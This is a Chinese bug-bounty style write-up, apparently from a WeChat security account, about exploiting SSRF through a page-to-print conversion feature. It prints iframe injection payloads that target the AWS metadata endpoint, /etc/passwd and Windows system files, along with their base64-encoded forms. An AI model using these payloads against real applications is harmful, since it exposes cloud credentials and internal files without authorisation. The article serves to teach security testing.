---
title: 利用SSRF访问内部数据
url: https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247496500&idx=1&sn=368776a42e67f89aadee8460a6e2163b&chksm=e8a5f957dfd27041a975c05b121161fd29c9ef4bbbbf567f0baedcba998c6d4c5bd9cceaf197&scene=58&subscene=0#rd
source: 迪哥讲事
date: 2024-12-03
fetch_date: 2025-10-06T19:40:28.298106
---

# 利用SSRF访问内部数据

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/YmmVSe19Qj7ElDZnx3HDYnmL4T1Ox2uN6fEcmelycpXJtd8PyN5RQb7y7ScTyDjrqEibM2mkTFwmLVGz7bNF1AQ/0?wx_fmt=jpeg)

# 利用SSRF访问内部数据

迪哥讲事

以下文章来源于骨哥说事
，作者骨哥说事

![](http://wx.qlogo.cn/mmhead/Tjnia6K0WAwzfic3VPt0EfMjicnGXzicDLoHEqtz1cP3Iozxf1tSyMxCFNG9Aya8SziaVKhVw7ia6QugE/0)

**骨哥说事**
.

一个喜爱鼓捣的技术宅

|  |
| --- |
| ****声明：****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。 |

#

# 前言

服务器端请求伪造 (SSRF) 是一种 Web 安全漏洞，当攻击者操纵服务器向非预期目标发出未经授权的 HTTP 或其他基于协议的请求时，就会发生此类漏洞。

# 在应用中寻找SSRF

比如某个应用程序使用了不同的内部域来处理财务数据，并通过 iframe 获取数据。

在深入探索该应用程序时，发现了一处打印功能。

此功能将页面转换为 HTML，以 Base64 对其进行编码，然后发送以等待打印。

这不禁让人想起了NahamSec 和其它安全研究人员的文章和视频中的 SSRF 技术，特别是围绕 PDF 转换功能，这些功能通常存在 SSRF 风险。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jl1uOxOnccqkiaCsDJlV6gvU4U5Y6XbqWL21VZHpiaV6rIxUbzibiarNPlQOP6iaByIoxNTphPibOm4Mb2g/640?wx_fmt=png&from=appmsg)

首先尝试使用一些常用的Payloads来检查 SSRF，比如使用针对 AWS 元数据端点和 Linux 文件路径的命令：

```
"><iframe src="http://169.254.169.254/latest/meta-data" height=2500 width=500> "><iframe src="cat /etc/passwd" height=2500 width=500>
```

但是遇到了 iframe 中高度和宽度参数的问题，这会导致输出失真。经过一番尝试，白帽小哥最终找到了这些参数的正确结构。

但是遇到了 iframe 中高度和宽度参数的问题，这会导致输出失真。经过一番尝试，白帽小哥最终找到了这些参数的正确结构。

```
"><iframe src="C:\Windows\debug\NetSetup.LOG" height=2500 width=500> "><iframe/src="C:/Windows/win.ini">
```

```
Ij48aWZyYW1lL3NyYz0iQzpcV2luZG93c1xkZWJ1Z1xOZXRTZXR1cC5MT0ciIGhlaWdodD0yNTAwIHdpZHRoPTUwMD4=Ij48aWZyYW1lL3NyYz0iQzpcV2luZG93c1xkZWJ1Z1xOZXRTZXR1cC5MT0ciIGhlaWdodD01MDAgd2lkdGg9NzAwPg==
```

发送请求如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jl1uOxOnccqkiaCsDJlV6gvUWV9gpCjXHULIxuQqjGet9N4XfwkzAiajibmdSQ1ZIFIcWvP4ic0qcCxFg/640?wx_fmt=png&from=appmsg)

成功收获SSRF漏洞：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jl1uOxOnccqkiaCsDJlV6gvUsLRuafZDIwJepOw7FCAtibHZT7t9AcbrZ0yKjwYTS6TuOjEKYccSibWg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jl1uOxOnccqkiaCsDJlV6gvU1dChmBFK3Lr879XXjDSjtlfBiaXkZleYucLtV57liaEK6x5B8AIQ58Jg/640?wx_fmt=png&from=appmsg)

如果你是一个长期主义者，欢迎加入我的知识星球，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款

![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5EMr3X76qdKBrhIIkBlVVyuiaiasseFZ9LqtibyKFk7gXvgTU2C2yEwKLaaqfX0DL3eoH6gTcNLJvDQ/640?wx_fmt=png&from=appmsg)

## 往期回顾

[一款bp神器](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495880&idx=1&sn=65d42fbff5e198509e55072674ac5283&chksm=e8a5faabdfd273bd55df8f7db3d644d3102d7382020234741e37ca29e963eace13dd17fcabdd&scene=21#wechat_redirect)

[ssrf绕过新思路](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495841&idx=1&sn=bbf477afa30391b8072d23469645d026&chksm=e8a5fac2dfd273d42344f18c7c6f0f7a158cca94041c4c4db330c3adf2d1f77f062dcaf6c5e0&scene=21#wechat_redirect)

[一个辅助测试ssrf的工具](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247496380&idx=1&sn=78c0c4c67821f5ecbe4f3947b567eeec&chksm=e8a5f8dfdfd271c935aeb4444ea7e928c55cb4c823c51f1067f267699d71a1aad086cf203b99&scene=21#wechat_redirect)

[dom-xss精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247488819&idx=1&sn=5141f88f3e70b9c97e63a4b68689bf6e&chksm=e8a61f50dfd1964692f93412f122087ac160b743b4532ee0c1e42a83039de62825ebbd066a1e&scene=21#wechat_redirect)

[年度精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)

[Nuclei权威指南-如何躺赚](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487122&idx=1&sn=32459310408d126aa43240673b8b0846&chksm=e8a604f1dfd18de737769dd512ad4063a3da328117b8a98c4ca9bc5b48af4dcfa397c667f4e3&scene=21#wechat_redirect)

[漏洞赏金猎人系列-如何测试设置功能IV](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486973&idx=1&sn=6ec419db11ff93d30aa2fbc04d8dbab6&chksm=e8a6079edfd18e88f6236e237837ee0d1101489d52f2abb28532162e2937ec4612f1be52a88f&scene=21#wechat_redirect)

[漏洞赏金猎人系列-如何测试注册功能以及相关Tips](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

迪哥讲事

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过